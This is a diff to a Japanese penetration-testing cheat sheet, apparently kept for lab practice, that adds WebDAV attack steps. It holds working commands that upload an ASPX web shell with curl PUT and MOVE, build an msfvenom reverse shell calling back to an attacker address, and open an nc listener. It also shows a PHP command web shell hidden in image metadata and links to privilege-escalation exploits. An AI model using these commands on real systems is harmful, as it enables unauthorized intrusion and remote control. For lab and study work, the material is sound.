@@ -690,6 +690,33 @@ exiftool image.jpg
 exiftool -Comment=’<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ image.png
 ```
 
+### WebDAV
+WebDAVとはファイルの読み取りや編集をHTTPを利用してWebブラウザ上で行えるようにする機能。  
+Nmapなどの結果よりPUTメソッドが許可されている場合、アップロードできるファイル形式などを確認する。
+```
+davtest -u http://10.10.10.15
+```
+許可されているファイルのアップロード  
+phpやaspxファイルが許可されている場合、reverse shellペイロードをアップロードしてシェルを取得する。  
+```
+curl -X PUT http://10.10.10.15/test.txt -d@test.txt
+```
+許可されている拡張子に制限がかけられており、MOVEメソッドが許可されている場合にはアップロードしたファイルの拡張子を変更することができる。  
+これを利用することで、WebShellの配置などが可能になる可能性がある。
+```
+# WebShell
+cp /usr/share/webshells/aspx/cmdasp.aspx ./
+curl -X PUT http://10.10.10.15/cmdasp.txt -d @cmdasp.aspx
+curl -X MOVE -H 'Destination:http://10.10.10.15/cmdasp.aspx' 'http://10.10.10.15/cmdasp.txt'
+
+# msfvenom
+msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=443 -f aspx > reverse.aspx
+curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.aspx
+curl -X MOVE -H 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt'
+rlwrap nc -lvnp 443
+curl http://10.10.10.15/shell.aspx
+```
+
 ### steghide
 ステガノグラフィー
 ```
@@ -2817,7 +2844,7 @@ https://github.com/SecWiki/windows-kernel-exploits.git
 Samba 3.0.20:
 https://github.com/amriunix/CVE-2007-2447.git
 
-Elastix 2.2.0:
+Elastix Elastix 2.2.0 - 'graph.php' Local File Inclusion
 https://www.exploit-db.com/exploits/37637
 FreePBX 2.10.0/Elastix 2.2.0 - Remote Code Execution:
 https://www.exploit-db.com/exploits/18650
@@ -2859,6 +2886,11 @@ Juicy-potato(x64):
 https://github.com/ohpe/juicy-potato.git  
 Juicy-potato(x86バイナリ):  
 https://github.com/ivanitlearning/Juicy-Potato-x86.git
+
+Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation
+(Microsoft(R) Windows(R) Server 2003, Standard Edition 5.2.3790 Service Pack 2 Build 3790):
+.\churrasco.exe whoami
+https://github.com/Re4son/Churrasco.git
 
 MS10-059(Microsoft Windows Server 2008 R2 Standard 6.1.7600 N/A Build 7600):
 .\MS10-059.exe 10.10.10.1 4444
